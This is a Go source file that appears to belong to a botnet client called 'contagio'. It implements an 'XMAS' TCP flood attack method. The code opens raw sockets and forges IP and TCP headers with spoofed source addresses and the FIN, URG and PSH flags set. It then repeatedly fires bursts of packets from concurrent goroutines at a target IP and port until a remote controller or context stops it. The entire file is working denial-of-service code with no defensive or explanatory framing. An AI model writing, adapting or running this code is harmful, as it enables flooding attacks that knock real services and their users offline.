package methods

import (
	"contagio/bot/config"
	"contagio/bot/utils"
	"context"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"syscall"
	"time"
)

func XmasMethod(ctx context.Context, ipaddr string, _port string, id int, ch chan int) {
	defer Catch()

	if config.DEBUG {
		fmt.Println("[xmas] Attack started")
	}

	port, err := strconv.Atoi(_port)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[xmas atoi] Port atoi error: " + err.Error())
		}
		return
	}

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[xmas flood] Can't open raw socket")
		}
		return
	}
	syscall.Close(fd)

	for {
		select {
		case <-ctx.Done():
			if config.DEBUG {
				fmt.Println("[xmas flood] Attack stopped")
			}
			return
		case sid := <-ch:
			if id == sid {
				if config.DEBUG {
					fmt.Println("[xmas flood] Attack stopped (by client)")
				}
				close(ch)
				return
			}
		case <-utils.StopChan:
			if config.DEBUG {
				fmt.Println("[xmas flood] Cpu balancer")
			}
			time.Sleep(5 * time.Second)
		default:

			go xmas(net.ParseIP(ipaddr).To4(), port)
			go xmas(net.ParseIP(ipaddr).To4(), port)
			go xmas(net.ParseIP(ipaddr).To4(), port)
			go xmas(net.ParseIP(ipaddr).To4(), port)
			go xmas(net.ParseIP(ipaddr).To4(), port)

			time.Sleep(50 * time.Millisecond)

		}
	}
}

func xmas(ip net.IP, port int) {

	defer Catch()

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[xmas flood] Can't open raw socket")
		}
		return
	}
	defer syscall.Close(fd)

	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	if err != nil {
		return
	}

	rand.NewSource(time.Now().UnixNano())

	srcIP := net.IP(make([]byte, 4))
	binary.BigEndian.PutUint32(srcIP[0:4], uint32(rand.Intn(1<<10-1)))

	ipv4Byte := CreateIpHeader(srcIP, ip)
	tcpByte := CreateTcpHeader(srcIP, ip, port, 0x01|0x20|0x08)

	buffs := make([]byte, 0)
	buffs = append(buffs, ipv4Byte...)
	buffs = append(buffs, tcpByte...)

	addr := syscall.SockaddrInet4{
		Port: port,
	}
	copy(addr.Addr[:4], ip)

	for i := 0; i <= 20; i++ {
		syscall.Sendto(fd, buffs, syscall.MSG_NOSIGNAL, &addr)
	}
}
